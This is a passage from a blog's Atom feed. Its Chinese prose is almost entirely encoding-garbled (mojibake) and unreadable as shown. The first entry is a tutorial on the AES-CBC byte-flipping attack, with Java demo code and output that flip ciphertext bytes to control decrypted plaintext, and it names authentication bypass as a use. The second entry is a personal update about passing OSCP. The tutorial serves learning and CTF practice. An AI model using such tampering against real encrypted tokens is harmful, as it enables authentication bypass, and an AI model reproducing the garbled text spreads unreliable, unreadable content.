title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h1><p>ç”±äºåœ¨ç¬¬äºŒæ®µå¯†æ–‡å—åŠä¹‹åçš„å¯†æ–‡å—ä¸­ï¼Œéƒ½æ˜¯ä¾æ®å‰ä¸€ä¸ªå¯†æ–‡å—æ¥åšè§£å¯†çš„ã€‚è‹¥ä¿®æ”¹äº†ä¸­é—´ä¸€ä¸ªå¯†æ–‡å—çš„å€¼ï¼Œåˆ™è§£å¯†å‡ºæ¥çš„æ˜æ–‡å½“ç„¶ä¹Ÿä¼šæ”¹å˜ã€‚æˆ‘ä»¬ä¾¿å¯å‡­å€Ÿè¿™ç§æ–¹å¼ï¼Œä¿®æ”¹å‰ä¸€å—å¯†æ–‡ï¼Œæ§åˆ¶ä¸‹ä¸€å—çš„å¯†æ–‡çš„è§£å¯†å€¼ã€‚</p><p><img src="/2022/05/17/2022-05-17-cbc-byte-flipping-attack/3.png"></p><p><strong>Demo</strong></p><p>æˆ‘ä»¬æ¥å†™ä¸ªç®€å•çš„AES CBCåŠ å¯†çš„demoã€‚ç”¨çš„å—é•¿åº¦æ˜¯16ï¼ˆkeyå’Œivé•¿åº¦ä¿æŒä¸º16å³å¯ï¼‰ï¼š</p><p><em>ps: ç”±äºAES/CBCæ˜¯å‰åç«¯å¯†æ–‡å¼ºå…³è”ï¼Œæ‰€ä»¥è¦æ±‚åŠ å¯†å¯†æ–‡16å­—èŠ‚å¯¹é½ã€‚Demoä¸­ç”¨çš„åŠ å¯†æ¨¡å¼æ˜¯â€NoPaddingâ€ï¼Œå³ä¸è‡ªåŠ¨è¿›è¡Œå­—èŠ‚å¡«å……å¯¹é½ï¼Œå°±éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å°†å¯†æ–‡å¡«å……æˆ16å­—èŠ‚å¯¹é½çš„å½¢å¼ã€‚â€NoPaddingâ€æ¨¡å¼ä¸ä¼šå¯¹å­—èŠ‚è‡ªåŠ¨å¡«å……ï¼Œåˆå­¦åº”è¯¥å¥½ç†è§£ä¸€ç‚¹ã€‚CBCå­—èŠ‚ç¿»è½¬æ˜¯å¯ä»¥å¯¹CBCçš„å…¶ä»–æ¨¡å¼è¿›è¡Œæ”»å‡»çš„ã€‚</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">// Generate PlainText, Cipher key and iv</span></span><br><span class="line">    String plainText = <span class="string">&quot;Hello World! How Are You?&quot;</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] key = <span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] iv = <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>.getBytes();</span><br><span class="line">    SecretKeySpec secretKeySpec = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    IvParameterSpec ivParameterSpec = <span class="keyword">new</span> IvParameterSpec(iv);</span><br><span class="line">    System.out.print(<span class="string">&quot;PlainText bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> aByte : plainText.getBytes()) &#123;</span><br><span class="line">        System.out.print(aByte + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encrypt</span></span><br><span class="line">    Cipher cipherEncode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherEncode.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec); <span class="comment">//1 is encode mode</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytesEncode = cipherEncode.doFinal(plainText.getBytes());</span><br><span class="line">    System.out.print(<span class="string">&quot;EnCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesEncode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    Cipher cipherDecode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherDecode.init(<span class="number">2</span>, secretKeySpec, ivParameterSpec); <span class="comment">//2 is decode mode</span></span><br><span class="line">    System.out.print(<span class="string">&quot;ReDeCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] bytesDecode = cipherDecode.doFinal(bytesEncode);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesDecode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    System.out.print(<span class="keyword">new</span> String(bytesDecode));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PlainText bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 32 65 114 101 32 89 111 117 63 </span><br><span class="line">PlatinText String: Hello World! How Are You?</span><br><span class="line">EnCrypt bytes: 90 40 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118 -16 97 -40 -40 -117 82 -23 31 80 7 -100 76 -78 66 -1 113 </span><br><span class="line">ReDeCrypt bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 32 65 114 101 32 89 111 117 63 65 65 65 65 65 65 65 </span><br><span class="line"></span><br><span class="line">----æŒ‰16å­—èŠ‚åˆ†å‰²</span><br><span class="line">PlainText bytes:</span><br><span class="line">72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119</span><br><span class="line">32 65 114 101 32 89 111 117 63 65 65 65 65 65 65 65</span><br><span class="line"></span><br><span class="line">EnCrypt bytes:</span><br><span class="line">90 40 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118</span><br><span class="line">29 69 117 22 -89 50 112 -109 9 18 -81 -116 -7 -54 -85 52</span><br><span class="line"></span><br><span class="line">ReDeCrypt bytes:</span><br><span class="line">72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119</span><br><span class="line">32 65 114 101 32 89 111 117 63 65 65 65 65 65 65 65</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¯†æ–‡å­—èŠ‚å°†ä¼šæŒ‰ç…§å—é•¿åº¦è¿›è¡Œå¯¹é½ã€‚åŸæ–‡æ€»é•¿25ï¼Œå¯†æ–‡æ€»é•¿32ã€‚æŒ‰16å­—èŠ‚å¯¹é½ã€‚</p><p>æ ¹æ®CBCåŠ å¯†æ¨¡å¼ä¸‹çš„åŠ å¯†æµç¨‹ï¼Œç¬¬ä¸€æ®µå¯†æ–‡ç”±äºæ˜¯å—<code>iv</code>æ§åˆ¶çš„ï¼Œè¿˜åŸæ—¶<code>ç¬¬ä¸€æ®µ</code>ä¸å¯æ§ã€‚åªæœ‰<code>ç¬¬äºŒæ®µ</code>åŠä¹‹åçš„å¯†æ–‡æ®µæ‰å¯ä»¥åœ¨è§£å¯†æ—¶æ§åˆ¶ã€‚</p><p>æ‹ä¸€æ‹è¿™ä¸€æ®µDemoä¸­ï¼Œæ˜æ–‡ç¬¬<code>2</code>æ®µç¬¬<code>0</code>å­—èŠ‚çš„å­—ç¬¦<code>32</code>çš„åŠ è§£å¯†æµç¨‹ï¼š</p><ul><li>åŠ å¯†: ç”¨å…¬å¼<code>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)</code>ï¼Œå¾—åˆ°<code>29=encrypt(32^90)</code></li><li>è§£å¯†: ç”¨å…¬å¼<code>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1</code>ï¼Œå¾—åˆ°<code>32=decrypt(29)^90</code><ul><li>è§£å¯†æ—¶ï¼Œå¿½ç•¥<code>decrypt()</code>å‡½æ•°ï¼Œå¯ä»¥æ‹†åˆ†æˆè¿™æ ·: <code>32=(32^90)^90</code></li><li><code>90^90=0</code>ï¼Œåˆ™<code>32^0</code>å°±èƒ½è¿˜åŸå›æ˜æ–‡<code>32</code>äº†</li></ul></li></ul><p>åœ¨è§£å¯†è¿‡ç¨‹ä¸­ï¼Œ<code>decrypt()</code>è°ƒç”¨å®Œåä¼šè¿”å›<code>32^90</code>ã€‚å³ç¬¬<code>2</code>æ®µæ˜æ–‡ç¬¬<code>0</code>å­—èŠ‚å¼‚æˆ–<strong>åŠ å¯†æ—¶</strong>ç¬¬<code>1</code>æ®µå¯†æ–‡ç¬¬<code>0</code>å­—èŠ‚ã€‚ç”±äºè¿™ä¸ªæ“ä½œè¯»å–çš„æ˜¯åŠ å¯†æ—¶æ•°æ®ï¼Œä½œä¸ºæ”»å‡»è€…è§’åº¦<strong>æ— æ³•æ§åˆ¶</strong>ï¼›ä½†åå¤´å¼‚æˆ–çš„<code>90</code>ï¼Œå³æ‰§è¡Œ<strong>è§£å¯†æ—¶</strong>çš„ç¬¬<code>1</code>æ®µå¯†æ–‡ç¬¬<code>0</code>å­—èŠ‚ï¼Œæ˜¯æˆ‘ä»¬<strong>å¯æ§</strong>çš„ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ä¼ å…¥è§£å¯†å‡½æ•°çš„å¯†æ–‡å³å¯ã€‚</p><p>è¿™é‡Œæ€è€ƒä¸€ä¸ªé—®é¢˜: æˆ‘ä»¬å¦‚ä½•ä½¿å¾—<code>32^90^XXX</code>çš„ç»“æœæ§åˆ¶ä¸ºä»»æ„è¾“å‡ºå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ¥çœ‹ä¸ªå¼‚æˆ–ä¸­çš„ä¸€ä¸ªç‰¹æ€§ï¼šç›¸åŒå­—èŠ‚å¼‚æˆ–ï¼Œç»“æœæ˜¯<code>0</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">byte</span> b = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">byte</span> c = (<span class="keyword">byte</span>)(a^b); <span class="comment">//28</span></span><br><span class="line"><span class="keyword">byte</span> d = (<span class="keyword">byte</span>)(a^b^c); <span class="comment">//0  //æˆ‘ä»¬æŠŠa^bå½“ä½œä¸€ä¸ªæ•´ä½“ï¼Œå°±å¥½ç†è§£äº†ã€‚a^bå…¶å®å°±æ˜¯cï¼Œc^cè‡ªç„¶å°±æ˜¯0</span></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶<code>x^x</code>è¿”å›çš„ç»“æœæ˜¯<code>0</code>ã€‚é‚£å¦‚æœæˆ‘ä»¬æ§åˆ¶ä¸Šæ–‡è¿™ä¸ª<code>XXX</code>çš„å€¼ä¸º<code>32^90</code>ï¼Œä¸å°±èƒ½æ§åˆ¶<strong>è¿™ä¸€ä¸ªå­—èŠ‚</strong>çš„è§£å¯†å€¼ä¸º<code>0</code>äº†å˜›ï¼Ÿå…¶ä¸­<code>32</code>å’Œ<code>90</code>è¿™ä¸¤ä¸ªå­—èŠ‚éƒ½æ˜¯å¯é¢„æµ‹çš„ï¼Œä¸€ä¸ªæ˜¯åŸå§‹æ˜æ–‡ï¼Œä¸€ä¸ªæ˜¯å¯†æ–‡ã€‚</p><p><em>Demo:</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//Generate PlainText, Cipher key and iv</span></span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encrypt</span></span><br><span class="line">    Cipher cipherEncode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherEncode.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec); <span class="comment">//1 is encode mode</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytesEncode = cipherEncode.doFinal(plainText.getBytes());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Change the &quot;1&quot; pos of second plain block byte to &quot;0&quot;. In the whole plainText the pos is &quot;17&quot;</span></span><br><span class="line">    bytesEncode[<span class="number">1</span>] = (<span class="keyword">byte</span>)(bytesEncode[<span class="number">1</span>] ^ plainTextBytes[<span class="number">17</span>]);  <span class="comment">//[!]</span></span><br><span class="line"></span><br><span class="line">    System.out.print(<span class="string">&quot;EnCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesEncode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>OUTPUT:</p><p>PlainText bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 <span style="color:red">**32 **</span>65 114 101 32 89 111 117 63 65 65 65 65 65 65 65<br>EnCrypt bytes: 90 105 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118 <span style="color:red"><strong>29</strong></span> 69 117 22 -89 50 112 -109 9 18 -81 -116 -7 -54 -85 52<br>ReDeCrypt bytes: 27 -126 -93 121 65 -48 81 -89 -14 15 62 53 -106 41 -44 86 32 <span style="color:red"><strong>0</strong></span> 114 101 32 89 111 117 63 65 65 65 65 65 65 65 </p><p>çœ‹åˆ°<code>[!]</code>è¿™ä¸€æ®µã€‚æˆ‘ä»¬é¢„æœŸä¿®æ”¹<strong>æ˜æ–‡</strong>ä¸‹æ ‡ä¸º<code>17</code>çš„å€¼ä¸º<code>0</code>ã€‚æ ¹æ®å‰é¢çš„æ¨æµ‹å¯çŸ¥ï¼Œæœ€ç»ˆè§£å¯†è¿˜åŸæ—¶æ˜¯é€šè¿‡å¼‚æˆ–<strong>æ˜æ–‡å­—èŠ‚</strong>å’Œ<strong>åŠ å¯†æ—¶å‰ä¸€æ®µå¯†æ–‡å­—èŠ‚</strong>åŠ<strong>è§£å¯†æ—¶å‰ä¸€æ®µå¯†æ–‡å­—èŠ‚</strong>å¾—åˆ°çš„ã€‚æˆ‘ä»¬å°†<strong>è§£å¯†æ—¶å‰ä¸€æ®µå¯†æ–‡å­—èŠ‚</strong>è®¾ç½®ä¸ºâ€<strong>æ˜æ–‡å­—èŠ‚</strong>å¼‚æˆ–<strong>åŠ å¯†æ—¶å‰ä¸€æ®µå¯†æ–‡å­—èŠ‚</strong>â€œï¼Œå³å¯è®©è§£å¯†ç»“æœä¸º<code>0</code></p><p>æ¥ä¸‹å†çœ‹åˆ°å¼‚æˆ–ä¸­çš„ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼š<code>0</code>å¼‚æˆ–ä»»ä½•æ•°ï¼Œç»“æœéƒ½æ˜¯é‚£ä¸ªæ•°:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">byte</span> b = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">byte</span> c = (<span class="keyword">byte</span>)(<span class="number">0</span>^a); <span class="comment">//10</span></span><br><span class="line"><span class="keyword">byte</span> d = (<span class="keyword">byte</span>)(<span class="number">0</span>^b); <span class="comment">//22</span></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶ä¸Šæ–‡æˆ‘ä»¬éƒ½èƒ½æ§åˆ¶è§£å¯†ç»“æœä¸º<code>0</code>äº†ï¼Œä¸ºä½•ä¸èƒ½è·Ÿè¿›ä¸€æ­¥ï¼Œè®©è§£å¯†ç»“æœä¸ºä»»æ„æ•°å€¼å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œåªè¦æˆ‘ä»¬åœ¨<code>0</code>çš„åŸºç¡€ä¸Šå†å¼‚æˆ–å¤šä¸€ä¸ªæ•°å€¼å³å¯ã€‚</p><p><em>Demo:</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//Generate PlainText, Cipher key and iv</span></span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="comment">//encrypt</span></span><br><span class="line">    Cipher cipherEncode = Cipher.getInstance(<span class="string">&quot;AES/CBC/NoPadding&quot;</span>);</span><br><span class="line">    cipherEncode.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec); <span class="comment">//1 is encode mode</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytesEncode = cipherEncode.doFinal(plainText.getBytes());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Change the &quot;1&quot; pos of second plain block byte to &quot;0&quot;. In the whole plainText the pos is &quot;17&quot;</span></span><br><span class="line">    <span class="comment">//ä¿®æ”¹</span></span><br><span class="line">    <span class="comment">//&quot;bytesEncode[1] ^ plainTextBytes[17]&quot; returns &#x27;0&#x27;. &quot;&#x27;0&#x27; ^ &#x27;x&#x27;&quot; returns &#x27;x&#x27; so that we can control the decrypt result.</span></span><br><span class="line">    bytesEncode[<span class="number">1</span>] = (<span class="keyword">byte</span>)(bytesEncode[<span class="number">1</span>] ^ plainTextBytes[<span class="number">17</span>] ^ <span class="string">&#x27;x&#x27;</span>);  <span class="comment">//[!]</span></span><br><span class="line"></span><br><span class="line">    System.out.print(<span class="string">&quot;EnCrypt bytes: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytesEncode) &#123;</span><br><span class="line">        System.out.print(b + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//decrypt</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OUTPUT:</p><p>PlainText bytes: 72 101 108 108 111 32 87 111 114 108 100 33 32 72 111 119 32 <span style="color:red"><strong>65</strong></span> 114 101 32 89 111 117 63 65 65 65 65 65 65 65<br>EnCrypt bytes: 90 105 -75 -65 -48 52 123 46 116 66 -13 -54 103 -120 5 -118 29 <span style="color:red"><strong>69</strong></span> 117 22 -89 50 112 -109 9 18 -81 -116 -7 -54 -85 52<br>ReDeCrypt bytes: -87 -95 -80 -82 25 -34 17 -119 -112 -56 69 103 21 -28 117 -65 32 <span style="color:red"><strong>120</strong></span> 114 101 32 89 111 117 63 65 65 65 65 65 65 65 </p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¬¬<code>17</code>å­—èŠ‚åœ¨è§£å¯†æ—¶å·²ç»è¢«æˆåŠŸæ§åˆ¶ä¸ºå­—ç¬¦<code>&#39;x&#39;</code>ã€‚</p><h1 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h1><ul><li>é‰´æƒç»•è¿‡ - CTFç”¨çš„å¤š</li><li>å’ŒPadding Oracleæ”»å‡»é…åˆï¼Œä¿®æ”¹æˆ–å¢åŠ å¯†æ–‡</li><li>â€¦â€¦</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">CBC byte flipping attackâ€”101 approach</a></p><p><a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html">https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åˆæœ‰åŠå¹´æ²¡æ›´åšå®¢233ï¼Œä¸»è¦æ˜¯æ‡’ï¼Œç¬”è®°å’Œæ–‡è¿˜æ˜¯æœ‰å†™çš„ï¼Œåªä¸è¿‡æˆ‘å¼€äº†ä¸€ä¸ªç§å¯†çš„è¯­é›€ï¼Œæ–‡éƒ½æ”¾åˆ°è¯­é›€ä¸Šäº†ã€‚ç°åœ¨ä»è¯­é›€é‚£æ‰’æ‹‰å‡ ç¯‡æ–‡ï¼Œä¸¢åˆ°åšå®¢ä¸Šå§ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="åŠ å¯†" scheme="http://example.com/categories/%E5%8A%A0%E5%AF%86/"/>
    
    
    <category term="åŠ å¯†" scheme="http://example.com/tags/%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>åšå®¢è·‘è·¯åŠå¹´ï¼Œç®€å•è¯´ä¸‹è¿™åŠå¹´å¹²äº†å˜›</title>
    <link href="http://example.com/2021/12/06/2021-12-06-talk/"/>
    <id>http://example.com/2021/12/06/2021-12-06-talk/</id>
    <published>2021-12-06T13:43:06.000Z</published>
    <updated>2021-12-06T15:22:36.539Z</updated>
    
    <content type="html"><![CDATA[<p>å¤§æ¦‚6æœˆä»½å§ã€‚æŠŠåŸŸåçš„å®åæ³¨é”€æ‰äº†ã€‚åŸå› æ˜¯ä¹‹å‰å¤‡æ¡ˆæ—¶æä¾›çš„ipæ—©å°±é‡Šæ”¾æ‰äº†ã€‚æ‹…å¿ƒåˆ«äººç”¨ç€é‚£ä¸ªipï¼Œç»‘çš„å®åå´æ˜¯æˆ‘è¿™é‡Œã€‚äºæ˜¯ä¹ï¼Œå°±æ³¨é”€äº†å®åã€‚ç„¶ååˆæŠŠæœåŠ¡å™¨é‡è£…äº†ä¸‹ã€‚å—¯ã€‚ç„¶åå°±ä¸€ç›´æ‡’å¾—å¼„äº†ã€‚</p><p>ç„¶åç›´åˆ°æœ€è¿‘ï¼Œæ‰æŠŠåšå®¢å†æ­èµ·æ¥ã€‚å› ä¸ºæ‡’å¾—é…æœåŠ¡å™¨ï¼Œåšå®¢ç›´æ¥æ”¾<code>github.io</code>äº†ã€‚å†æŠŠåŸå…ˆåŸŸåçš„CNAMEä¸€æŒ‡ï¼Œå®Œäº‹ã€‚å¤šç®€å•ã€‚</p><p><strong>ç®€å•æ¢³ç†ä¸‹è¿™åŠå¹´å¹²äº†å•¥</strong></p><p>6-8æœˆï¼Œæ”¾æš‘å‡ã€‚åœ¨å®¶ç©ç©é­”å…½ï¼Œçœ‹çœ‹ç•ªï¼Œå­¦äº†å­¦Javaã€è½¦ã€çƒ¹é¥ªã€‚æœ€å¤§æ”¶è·æ˜¯å¤§æ¦‚ææ‡‚äº†RMIã€è¿‡äº†ç§‘äºŒã€èƒ½æ“ä¸€ä¸¤ä¸ªè¿˜èƒ½çœ‹çš„é¢åŒ…å’Œè›‹ç³•ã€‚ã€‚å—¯ã€‚ã€‚å¯ä»¥è¯´åˆæ˜¯è’åºŸäº†ä¸€ä¸ªæš‘å‡</p><p>9æœˆï¼Œå› ä¸ºä¹‹å‰OSCPè€ƒè¯•æŒ‚äº†ã€‚æ‰€ä»¥æ‰“äº†ä¸€ä¸ªæœˆvulnhubé¶æœºã€‚çº¦è€ƒ10æœˆ5å·ï¼Œå‡†å¤‡è€ƒè¯•ã€‚</p><p>10æœˆè‡³ä»Šï¼Œå¹¸å¥½ï¼ŒOSCPè¿‡äº†ã€‚ä¸ç„¶åˆå¾—å»æ°´æ–‡èµšè¡¥è€ƒè´¹äº†ã€‚è¿‡äº†ä¹‹åã€‚ç…§å¸¸åœ¨å­¦æ ¡å­¦å­¦Javaï¼Œè¿™æ ·ã€‚ç®€å•ä¸€æƒ³ã€‚æˆ‘å¥½åƒä¹Ÿæ²¡å­¦å•¥ã€‚å•§ï¼Œï¼Œæ‡’å¾—æ¢³ç†äº†ã€‚å­¦ä¹ æ—¶å†™çš„æ–‡ï¼Œï¼Œæœ‰ç©ºå†ä¼ åˆ°åšå®¢æ¥å§ã€‚æˆ‘å¥½æ‡’ = =</p><p><strong>Todo</strong></p><p>ä»Šå¤©æ— æ„ç¿»äº†ç¿»ä¸‰æ¢¦å¸ˆå‚…çš„åšå®¢ã€‚çœ‹åˆ°å¸ˆå‚…æ‰§è¡Œè¿‡ARTSï¼Œå³æ¯å‘¨è‡³å°‘åšä¸€ä¸ªç®—æ³•é¢˜(Algorithm)ï¼›æ¯å‘¨é˜…è¯»ç‚¹è¯„ä¸€ç¯‡è‹±è¯­æŠ€æœ¯æ–‡ç« (Review)ï¼›æ¯å‘¨å­¦ä¹ è‡³å°‘ä¸€ä¸ªæŠ€æœ¯æŠ€å·§(Tip)ï¼›æ¯å‘¨åˆ†äº«ä¸€ç¯‡æœ‰è§‚ç‚¹æ€è€ƒçš„æŠ€æœ¯æ–‡ç« (Share)ã€‚</p><p>æˆ‘ä¹Ÿæƒ³è¯•è¯•å“ˆå“ˆå“ˆã€‚é™ä½ä¸‹æ ‡å‡†ã€‚æˆ‘æ¥è¯•ä¸‹â€WRTSâ€ã€‚å³ï¼š</p><p>W: æ¯å‘¨è‡³å°‘å¤ç°ä¸€ä¸ªæ¼æ´</p><p>R: æ¯å‘¨è‡³å°‘é˜…è¯»ä¸€ç¯‡è‹±è¯­æŠ€æœ¯æ–‡ç« ï¼Œåˆ†æå¹¶å†™å‡ºç†è§£</p><p>T: æ¯å‘¨è‡³å°‘å­¦ä¹ ä¸€ä¸ªæŠ€æœ¯æŠ€å·§</p><p>S: æ¯å‘¨åˆ†äº«ä¸€ç¯‡æŠ€æœ¯æ–‡ç« </p><p>å—¯ï¼Œï¼Œï¼Œæ„Ÿè§‰ï¼Œï¼Œè¿˜è¡Œï¼Œä¸ç®—å¤ªéš¾å§å“ˆå“ˆå“ˆå“ˆã€‚</p><p>å°±è¿™æ ·è¶´</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤§æ¦‚6æœˆä»½å§ã€‚æŠŠåŸŸåçš„å®åæ³¨é”€æ‰äº†ã€‚åŸå› æ˜¯ä¹‹å‰å¤‡æ¡ˆæ—¶æä¾›çš„ipæ—©å°±é‡Šæ”¾æ‰äº†ã€‚æ‹…å¿ƒåˆ«äººç”¨ç€é‚£ä¸ªipï¼Œç»‘çš„å®åå´æ˜¯æˆ‘è¿™é‡Œã€‚äºæ˜¯ä¹ï¼Œå°±æ³¨é”€äº†å®åã€‚ç„¶ååˆæŠŠæœåŠ¡å™¨é‡è£…äº†ä¸‹ã€‚å—¯ã€‚ç„¶åå°±ä¸€ç›´æ‡’å¾—å¼„äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åç›´åˆ°æœ€è¿‘ï¼Œæ‰æŠŠåšå®¢å†æ­èµ·æ¥ã€‚å› ä¸ºæ‡’å¾—é…æœåŠ¡å™¨ï¼Œåšå®¢ç›´æ¥æ”¾&lt;code</summary>
      
    
    
    
